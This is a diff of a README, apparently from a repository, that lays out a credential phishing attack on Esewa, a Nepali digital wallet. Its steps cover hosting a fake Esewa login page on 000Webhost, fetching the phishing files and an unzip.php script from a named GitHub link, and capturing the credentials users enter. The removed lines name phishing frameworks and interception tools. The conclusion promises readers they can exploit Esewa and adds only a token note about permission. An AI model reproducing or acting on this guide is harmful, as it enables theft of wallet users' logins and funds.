@@ -2,17 +2,10 @@
 # Esewa Exploiting: Credential Phishing on 000Webhost (With Script Download)
 
 This guide will walk you through the process of exploiting Esewa, a popular digital wallet in Nepal, using a credential phishing attack. We will be using 000Webhost as our web hosting service and downloading a script to automate the unzipping process.
-## Prerequisites
-
-Before beginning this attack, you will need the following tools and resources:
-* A phishing framework or method for creating a fake Esewa login page. This can be as simple as creating a basic HTML page and hosting it on a web server, or you can use a more advanced tool such as [Spoof](https://github.com/drk1wi/Spoof) or [Modlishka](https://github.com/drk1wi/Modlishka).
-* A way to capture the user's credentials once they are entered on the fake login page. This can be done using a tool such as [Burp Suite](https://portswigger.net/burp) or [Wireshark](https://www.wireshark.org/) to intercept and analyze network traffic.
-* A free account on [000Webhost](https://www.00webhost.com/).
-* The repository files and the `unzip.php` file from [this link](https://github.com/<USERNAME>/Esewa-Phishing/archive/refs/heads/main.zip).
 
 ## Steps
 
-1. Download the repository files and the `unzip.php` file from the provided link.
+1. Download the repository files and the `unzip.php` file from the provided link https://github.com/BijayaTamangShyangtan/Files/blob/main/File/unzip.php
 2. Unzip the downloaded repository files.
 3. Host the fake login page on 000Webhost. Here are the steps to do this:
     a. Sign up for a free account on 000Webhost.
@@ -36,7 +29,8 @@ Before beginning this attack, you will need the following tools and resources:
 
 ## About Developer Bijaya Tamang
 
-Bijaya Tamang is a Nepalese software developer who is known for his work on the Esewa platform. He has contributed significantly to the development and maintenance of the Esewa application. As an employee of Esewa, he is not involved in any unauthorized security testing or hacking activities.
+
+
 ## Conclusion
 
 Credential phishing is a powerful attack that can be used to gain unauthorized access to a user's account. By following the steps outlined in this guide, you can successfully exploit Esewa using this attack. However, it is important to remember that this attack should only be used with the explicit permission and authorization of the target user and Esewa.
